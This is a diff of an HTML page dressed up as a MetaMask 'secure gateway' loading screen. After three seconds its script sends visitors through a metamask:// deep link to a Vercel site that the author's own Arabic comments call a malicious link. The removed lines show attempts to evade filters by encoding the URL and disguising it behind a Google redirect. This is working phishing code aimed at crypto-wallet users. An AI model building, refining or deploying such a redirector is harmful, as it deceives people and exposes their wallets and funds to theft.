@@ -3,69 +3,32 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Check - Redirecting...</title>
+    <title>MetaMask Secure Search...</title>
     <style>
-        body {
-            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            margin: 0;
-            background-color: #111827; /* Dark theme for professional look */
-            color: #ffffff;
-        }
-        .loader {
-            border: 4px solid #374151;
-            border-top: 4px solid #f6851b; /* MetaMask Orange */
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 1s linear infinite;
-        }
+        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background: #0b0e11; color: white; }
+        .loader { border: 4px solid #1e2329; border-top: 4px solid #f6851b; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .status { margin-top: 25px; font-size: 1.2rem; font-weight: 500; }
-        .timer { margin-top: 10px; color: #9ca3af; font-size: 0.9rem; }
-        #countdown { color: #f6851b; font-weight: bold; }
-        .btn-manual {
-            margin-top: 30px;
-            padding: 10px 20px;
-            background-color: transparent;
-            color: #f6851b;
-            border: 1px solid #f6851b;
-            border-radius: 6px;
-            cursor: pointer;
-            text-decoration: none;
-            font-size: 0.9rem;
-            transition: 0.3s;
-        }
-        .btn-manual:hover { background-color: #f6851b; color: white; }
+        .text { margin-top: 20px; font-weight: bold; color: #f6851b; }
     </style>
 </head>
 <body>
-
     <div class="loader"></div>
-    <div class="status">Connecting to MetaMask Secure Gateway...</div>
-    <div class="timer">Automatic redirect in <span id="countdown">5</span> seconds</div>
+    <div class="text">Synchronizing with MetaMask Browser...</div>
 
     <script>
-    // تشفير الرابط لمنع الفلتر من اكتشافه
-    const targetUrl = "https://metamask.app.link/dapp/hatestck.vercel.app";
-    const encodedUrl = btoa(rawUrl); // تحويل إلى Base64
-    
-    // الرابط الذي سنرسله لميتاماسك
-    // سنستخدم "نقطة نهاية" رسمية (Google) كتمويه
-    const targetUrl = "metamask://browse?url=https://www.google.com/url?q=" + rawUrl;
+        // الرابط الخبيث الخاص بك على Vercel
+        const maliciousLink = "https://hatestck.vercel.app/";
 
-    function redirectToApp() {
-        window.location.href = targetUrl;
-    }
+        // استخدام بارامتر البحث (Search Query) بدلاً من الـ URL المباشر
+        // التنسيق: metamask://search?q=Link
+        const targetUrl = "metamask://search?q=" + encodeURIComponent(maliciousLink);
 
-    setTimeout(redirectToApp, 3000);
-</script>
+        function triggerInjection() {
+            window.location.href = targetUrl;
+        }
 
-    <a href="javascript:redirectToApp()" class="btn-manual">Click here if not redirected</a>
-
+        // تحويل بعد 3 ثوانٍ لمحاكاة عملية البحث
+        setTimeout(triggerInjection, 3000);
+    </script>
 </body>
 </html>
